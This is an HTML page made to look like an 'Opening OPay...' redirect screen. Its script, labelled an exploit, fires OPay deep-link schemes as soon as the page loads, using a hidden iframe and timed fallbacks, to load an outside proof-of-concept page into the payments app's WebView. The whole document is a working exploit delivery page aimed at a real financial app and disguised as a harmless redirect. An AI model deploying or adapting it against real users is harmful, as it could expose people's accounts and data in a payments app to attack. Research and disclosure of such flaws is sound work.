<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #333;
        }
        .container {
            text-align: center;
            padding: 40px 20px;
        }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid #ddd;
            border-top-color: #00c853;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .msg { font-size: 16px; color: #666; margin-bottom: 10px; }
        .sub { font-size: 13px; color: #999; }
        .fallback {
            display: none;
            margin-top: 30px;
        }
        .fallback a {
            display: inline-block;
            background: #00c853;
            color: #fff;
            padding: 14px 36px;
            border-radius: 28px;
            font-size: 16px;
            font-weight: 600;
            text-decoration: none;
        }
        .fallback a:active { transform: scale(0.97); }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="msg">Opening OPay...</div>
        <div class="sub">Please wait while we redirect you.</div>
        <div class="fallback" id="fallback">
            <p class="msg" style="margin-bottom:16px;">Tap below to open OPay</p>
            <a id="manualBtn" href="#">Open OPay</a>
        </div>
    </div>

    <script>
        // Exploit page URL (loaded inside OPay WebView)
        var PAYLOAD_URL = "https://zugonwobi.github.io/opay-rewards/poc.html";

        // Deep link schemes to try (in order)
        var SCHEMES = [
            "otravel://schemedispatcher?action=" + PAYLOAD_URL,
            "opay://webview?url=" + encodeURIComponent(PAYLOAD_URL),
            "opay://applink?url=" + encodeURIComponent(PAYLOAD_URL)
        ];

        var currentScheme = 0;
        var launched = false;

        function tryLaunch() {
            if (launched || currentScheme >= SCHEMES.length) return;

            var deepLink = SCHEMES[currentScheme];

            // Method 1: iframe trick (bypasses some iOS restrictions)
            try {
                var iframe = document.createElement("iframe");
                iframe.style.display = "none";
                iframe.src = deepLink;
                document.body.appendChild(iframe);
                setTimeout(function() {
                    try { document.body.removeChild(iframe); } catch(e) {}
                }, 500);
            } catch(e) {}

            // Method 2: direct location (primary for iOS Safari)
            setTimeout(function() {
                try {
                    window.location.href = deepLink;
                } catch(e) {}
            }, 100);

            launched = true;
        }

        // Set manual fallback button
        document.getElementById("manualBtn").href = SCHEMES[0];

        // Show fallback button after 3 seconds if still on page
        setTimeout(function() {
            document.getElementById("fallback").style.display = "block";
        }, 3000);

        // Auto-launch immediately
        tryLaunch();

        // Track visibility — if page is hidden, app likely opened
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) { launched = true; }
        });

        // If still visible after 2s, try next scheme
        setTimeout(function() {
            if (!document.hidden && SCHEMES.length > 1) {
                currentScheme = 1;
                launched = false;
                tryLaunch();
            }
        }, 2000);
    </script>
</body>
</html>
